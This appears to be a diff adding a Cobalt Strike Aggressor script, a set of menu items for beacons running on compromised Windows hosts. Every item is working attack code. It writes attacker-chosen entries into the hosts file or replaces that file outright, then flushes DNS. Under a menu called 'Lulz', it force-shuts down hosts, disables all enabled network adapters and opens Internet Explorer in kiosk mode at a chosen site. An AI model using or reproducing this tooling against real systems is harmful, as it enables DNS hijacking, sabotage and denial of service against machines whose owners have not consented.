@@ -1,0 +1,41 @@
+popup beacon_bottom {
+	menu "Misc" {
+		item "Add Host File Entry" {
+			prompt_text("Specify an entry to add to the host file:", "127.0.0.1 google.com", lambda({
+				bshell(@ids, 'echo ' . $1 . ' >> c:\\windows\\System32\\Drivers\\Etc\Hosts');
+				blog(@ids,"Adding the following entry to the host file: $1 ");
+				bshell(@ids, "ipconfig /flushdns");
+			}, @ids => $1));
+		}
+		item "Replace Host File" {
+			prompt_file_open("Choose a file to replace the current host file:", "hosts.txt", false, lambda({
+				bcd(@ids,"c:\\windows\\system32\\drivers\\etc");
+				brm(@ids,"hosts");
+				blog(@ids,"Uploading file $1 to c:\\windows\\system32\\drivers\\etc\\hosts");
+				bupload(@ids,$1);
+				bshell(@ids, "ipconfig /flushdns");
+				blog(@ids,"File uploaded and DNS flushed. Done!");
+			}, @ids => $1));
+		}
+	}
+  	menu "Lulz" {
+    		item "Shutdown Host" {
+      			prompt_confirm("Are you SURE you want to bounce the box(es)?", "Confirm", lambda({
+        			blog(@ids,"shutting down");
+        			bshell(@ids, "shutdown /s /f /t 00 -d up:125:1");
+      			}, @ids => $1));
+		}
+		item "Disable Network" {
+			prompt_text("Specify the interface to disable:", "7", lambda({
+				bshell(@ids,"wmic path win32_networkadapter where netenabled='TRUE' call disable");
+				blog(@ids,"Disabling network interface $1 ");
+			}, @ids => $1));
+    		}
+    item "IE Kiosk Popup" {
+      prompt_text("What site do you want to pop up?", "https://google.com", lambda({
+        binput(@ids,"C:\\Progra~1\\Intern~1\\iexplore.exe -k $1");
+        bshell(@ids, "C:\\Progra~1\\Intern~1\\iexplore.exe -k $1");
+      }, @ids => $1));
+    }
+ 	}
+}
